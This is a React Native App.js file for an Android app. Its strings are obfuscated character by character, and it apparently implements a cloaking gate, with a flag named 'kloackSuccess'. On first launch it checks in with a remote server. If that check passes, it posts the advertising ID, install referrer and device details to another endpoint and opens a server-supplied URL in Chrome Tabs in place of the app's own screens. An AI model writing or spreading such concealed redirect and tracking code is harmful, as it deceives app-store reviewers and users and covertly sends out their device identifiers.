import { DarkTheme, NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { useEffect, useState, useCallback, useRef } from 'react';

import RootNavigator from './src/navigation/RootNavigator';
import { colors } from './src/theme';

import { getLocales } from 'react-native-localize';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import { OneSignal } from 'react-native-onesignal';
import { PlayInstallReferrer } from 'react-native-play-install-referrer';

import { _dru, _dnu, _did, _dsg } from './config/cred';
import { handleGetAaid as _ga } from './config/aaid';
import { genTimeStamp as _gts } from './config/utils';
import ChromeTabs from './routeSub/TargetChromeTabs';
import WelcomeScreen from './routeSub/WelcomeScreen';

const Stack = createNativeStackNavigator();

const _gx = globalThis;
const _fx = ['f', 'e', 't', 'c', 'h'].join('');

const _k0 = ['o', 'n', 'e', 'S', 'i', 'g', 'n', 'a', 'l', 'U', 's', 'e', 'r', 'I', 'd'].join('');
const _kh = ['h', 'a', 's', 'V', 'i', 's', 'i', 't', 'e', 'd', 'B', 'e', 'f', 'o', 'r', 'e'].join('');
const _kt = ['t', 'i', 'm', 'e', 'S', 't', 'a', 'm', 'p'].join('');
const _kb = ['b', 'a', 's', 'e', 'L', 'i', 'n', 'k'].join('');
const _km = ['c', 'u', 's', 't', 'o', 'm', 'M', 'm', 'p', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e'].join('');

const _mt = ['P', 'O', 'S', 'T'].join('');
const _h1 = ['C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e'].join('');
const _h1v = ['a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n'].join('');
const _h2 = ['U', 's', 'e', 'r', '-', 'A', 'g', 'e', 'n', 't'].join('');

const _e1 = ['p', 'u', 's', 'h', '_', 'o', 'p', 'e', 'n', '_', 'b', 'r', 'o', 'w', 's', 'e', 'r'].join('');
const _e2 = ['p', 'u', 's', 'h', '_', 'o', 'p', 'e', 'n', '_', 'w', 'e', 'b', 'v', 'i', 'e', 'w'].join('');

const _k1 = ['i', 'd', 'f', 'v'].join('');
const _sc = 0xc8; // 200

const _p1 = ['o', 'n', 'e', 'S', 'i', 'g', 'n', 'a', 'l', 'I', 'd'].join('');
const _p2 = ['c', 'u', 's', 't', 'o', 'm', 'e', 'r', 'U', 's', 'e', 'r', 'I', 'd'].join('');
const _p3 = ['j', 't', 'h', 'r', 'h', 'g'].join('');
const _p4 = ['i', 'd', 'f', 'a'].join('');
const _tg = ['t', 'i', 'm', 'e', 's', 't', 'a', 'm', 'p', '_', 'u', 's', 'e', 'r', '_', 'i', 'd'].join('');
const _ev = ['e', 'v', 'e', 'n', 't'].join('');
const _yh = ['y', 'h', 'u', 'g', 'h'].join('');
const _sid = ['s', 'u', 'b', '_', 'i', 'd', '_', '2', '0'].join('');

function App() {
  const [regId, setRegId] = useState('');
  const [grantBit, setGrantBit] = useState(false);
  const [oneSignalMountDone, setOneSignalMountDone] = useState(false);
  const [sessMark, setSessMark] = useState('');
  const [coldStart, setColdStart] = useState(null);
  const [faultBit, setFaultBit] = useState(false);
  const [hwToken, setHwToken] = useState('');

  const [wakeBit, setWakeBit] = useState(false);
  const pushOpenRef = useRef(false);
  const wakeGateRef = useRef(null);
  const wakeGateResolveRef = useRef(() => {});

  const [destRef, setDestRef] = useState(null);
  const [srcTag, setSrcTag] = useState('');
  const [svcLoad, setSvcLoad] = useState('');

  useEffect(() => {
    wakeGateRef.current = new Promise((resolve) => {
      wakeGateResolveRef.current = resolve;
      setTimeout(resolve, 700);
    });

    const _init = async () => {
      try {
        const [, { v0: _fv, v1: _ts }] = await Promise.all([
          mountSvc(),
          loadMeta(),
        ]);

        if (_fv) {
          await runGate(_fv, _ts);
        }
      } catch (_e) {}
    };
    _init();
  }, []);

  const onLateId = useCallback(async (_id) => {
    try {
      setRegId(_id);
      await AsyncStorage.setItem(_k0, _id);

      const _bl = await AsyncStorage.getItem(_kb);
      if (_bl && _bl.includes(`${_p1}=&`)) {
        await AsyncStorage.setItem(_kb, _bl.replace(`${_p1}=&`, `${_p1}=${_id}&`));
      }
    } catch (_e) {}
  }, []);

  const mountSvc = useCallback(async () => {
    try {
      OneSignal.initialize(_dsg);

      OneSignal.Notifications.addEventListener('click', (_ev0) => {
        onWake(_ev0);
      });

      OneSignal.User.addEventListener('change', (_ev0) => {
        const _id = _ev0?.current?.onesignalId;
        if (_id) {
          onLateId(_id);
        }
      });

      OneSignal.Notifications.addEventListener('permissionChange', (_g) => {
        setGrantBit(!!_g);
      });
    } catch (_e) {}

    await new Promise((resolve) => setTimeout(resolve, 500));

    try {
      const _poll = async () => {
        let _u = null;
        let _a = 0;
        const _mx = 10;
        while (!_u && _a < _mx) {
          await new Promise((resolve) => setTimeout(resolve, 500));
          _u = await OneSignal.User.getOnesignalId();
          _a++;
        }
        return _u;
      };

      const _uid0 = await Promise.race([
        _poll(),
        new Promise((resolve) => setTimeout(() => resolve(null), 8000)),
      ]);

      if (_uid0) {
        setRegId(_uid0);
        await AsyncStorage.setItem(_k0, _uid0);
      }

      const _pr = await Promise.race([
        OneSignal.Notifications.requestPermission(true),
        new Promise((resolve) => setTimeout(() => resolve(false), 5000)),
      ]);

      setGrantBit(_pr);
    } catch (_e) {
      try {
        const _su = await AsyncStorage.getItem(_k0);
        if (_su) {
          setRegId(_su);
        }
      } catch (_e2) {}
    } finally {
      setOneSignalMountDone(true);
    }
  }, []);

  const runGate = useCallback(async (_fv, _st) => {
    try {
      const _ir = await pullTag();
      const _sr = _ir?.slice(0, 15) ?? '';
      const _vu = `${_dnu}${_did}?${_k1}=${_sr}`;

      if (_fv) {
        OneSignal.User.addTag('timestamp_user_id', _st);
        OneSignal.login(_st);
        const _ua = await DeviceInfo.getUserAgent();

        const _rs = await _gx[_fx](_vu, {
          method: _mt,
          headers: {
            [_h1]: _h1v,
            [_h2]: _ua,
          },
        });
        if (_rs.status === _sc) {
          await AsyncStorage.setItem(_kh, 'true');
          await AsyncStorage.setItem('kloackSuccess', 'true');
          await syncTrace();
        } else {
          setFaultBit(true);
        }
      }
    } catch (_e) {
      setFaultBit(true);
    }
  }, []);

  const loadMeta = useCallback(async () => {
    try {
      const _hv = await AsyncStorage.getItem(_kh);
      let _st = await AsyncStorage.getItem(_kt);
      if (!_st) {
        _st = _gts();
        await AsyncStorage.setItem(_kt, _st);
      }

      setSessMark(_st);
      const _fv = _hv === null ? true : false;
      setColdStart(_fv);
      return { v0: _fv, v1: _st };
    } catch (_e) {
      return { v0: false, v1: '' };
    }
  }, []);

  const syncTrace = useCallback(async () => {
    try {
      const _bid = await DeviceInfo.getBuildId().then((_b) => _b);

      const _gd = await _ga().then((_g) => {
        if (_g) {
          setHwToken(_g);
          return _g;
        }
      });

      const _lc = () => {
        try {
          const _ls = getLocales();
          const _p0 = _ls[0];
          return _p0.languageCode;
        } catch (_e) {
          return '';
        }
      };

      const _body = {
        corder: _gd,
        linestrt: await pullTag(),
        and_os_and_version: DeviceInfo.getSystemVersion(),
        and_android_locale: _lc(),
        and_android_device: DeviceInfo.getModel(),
        and_android_build: _bid,
      };

      const _rs = await _gx[_fx](_dru, {
        method: _mt,
        headers: {
          [_h1]: _h1v,
        },
        body: JSON.stringify(_body),
      });

      if (_rs.ok) {
        try {
          const _dt = await _rs.json();

          if (_dt && _dt.raw_str) {
            const _rw = _dt.raw_str;
            const _sp = _rw.split('&sub_id_20')[0];

            await AsyncStorage.setItem(_km, _sp);
            setSvcLoad(_sp);
          } else {
            await AsyncStorage.setItem(_km, 'false');
            setSvcLoad('false');
          }
        } catch (_e) {
          await AsyncStorage.setItem(_km, 'false');
          setSvcLoad('false');
        }
      } else {
        await AsyncStorage.setItem(_km, 'false');
        setSvcLoad('false');
      }
    } catch (_e) {
      await AsyncStorage.setItem(_km, 'false');
      setSvcLoad('false');
    }
  }, []);

  const pullTag = useCallback(async () => {
    return new Promise((resolve) => {
      PlayInstallReferrer.getInstallReferrerInfo((_info, _err) => {
        if (!_err) {
          const _r = _info?.installReferrer;
          if (_r) {
            setSrcTag(_r);
            resolve(_r);
          } else {
            resolve(null);
          }
        } else {
          resolve(null);
        }
      });
    });
  }, []);

  const onWake = useCallback(async (_ev0) => {
    const _st = await AsyncStorage.getItem(_kt);
    const _bu = `${_dnu}${_did}`;
    let _fu;

    pushOpenRef.current = true;
    wakeGateResolveRef.current();

    try {
      const _hv = await AsyncStorage.getItem(_kh);

      if (_ev0.notification.launchURL) {
        _fu = `${_bu}?${_ev}=${_e1}&${_tg}=${_st}`;
        await _gx[_fx](_fu);
        setWakeBit(true);
      } else {
        _fu = `${_bu}?${_ev}=${_e2}&${_tg}=${_st}`;
        setWakeBit(true);

        if (!_hv) {
          await AsyncStorage.setItem(_kh, 'true');
        }

        await _gx[_fx](_fu);
      }
    } catch (_e) {}
  }, []);

  const mkBase = (params) => {
    const _b = `${_dnu}${_did}?${_did}=1`;
    const _sp = new URLSearchParams();
    _sp.append(_p1, params.oneSignalId);
    _sp.append(_p3, params.stamp);
    return `${_b}&${_sp.toString()}`;
  };

  const mkOut = (baseUrl, attribution) => {
    let _u = baseUrl;

    if (attribution.pushOpen) {
      _u += `&${_yh}=true`;
    }

    const { mmp, adId, encodedReferrer } = attribution;

    // All subId1-6 params are always appended exactly as the BERRY MMP
    // response returned them, including when empty — the partner backend
    // requires the full set every time. Never strip or conditionally drop any.
    if (mmp && mmp !== 'false') {
      return _u + mmp;
    }

    return (
      _u + `&${_p4}=${adId}&${_p2}=BERRY_MMP_FAIL&${_sid}=${encodedReferrer}`
    );
  };

  useEffect(() => {
    if (coldStart === null) {
      return;
    }

    const _resolve = async () => {
      if (wakeGateRef.current) {
        await wakeGateRef.current;
      }

      let _bu = null;
      let _mmp = null;

      if (coldStart) {
        if (!oneSignalMountDone || !sessMark || !svcLoad) {
          return;
        }

        _bu = mkBase({
          oneSignalId: regId || '',
          stamp: sessMark,
        });
        await AsyncStorage.setItem(_kb, _bu);

        _mmp = svcLoad;
      } else {
        _bu = await AsyncStorage.getItem(_kb);
        _mmp = await AsyncStorage.getItem(_km);
      }

      if (!_bu) {
        setFaultBit(true);
        return;
      }

      const _fu = mkOut(_bu, {
        pushOpen: pushOpenRef.current,
        mmp: _mmp,
        adId: hwToken,
        encodedReferrer: encodeURIComponent(srcTag),
      });

      setDestRef(_fu);
    };

    _resolve();
  }, [
    coldStart,
    oneSignalMountDone,
    regId,
    sessMark,
    wakeBit,
    svcLoad,
    hwToken,
    srcTag,
  ]);

  return (
    <SafeAreaProvider>
      <NavigationContainer
        theme={{
          ...DarkTheme,
          colors: {
            ...DarkTheme.colors,
            background: colors.bg,
            card: colors.card,
            text: colors.text,
            primary: colors.gold,
          },
        }}
      >
        <Stack.Navigator screenOptions={{ headerShown: false }}>
          {destRef ? (
            <Stack.Screen
              name="ChromeTabs"
              component={ChromeTabs}
              initialParams={{
                isFirstVisit: coldStart,
                timeStamp: sessMark,
                url: destRef,
                oneSignalPermissionStatus: grantBit,
              }}
            />
          ) : faultBit ? (
            <Stack.Screen name="RootNavigator" component={RootNavigator} />
          ) : (
            <Stack.Screen name="CustomeWelcome" component={WelcomeScreen} />
          )}
        </Stack.Navigator>
      </NavigationContainer>
    </SafeAreaProvider>
  );
}

export default App;
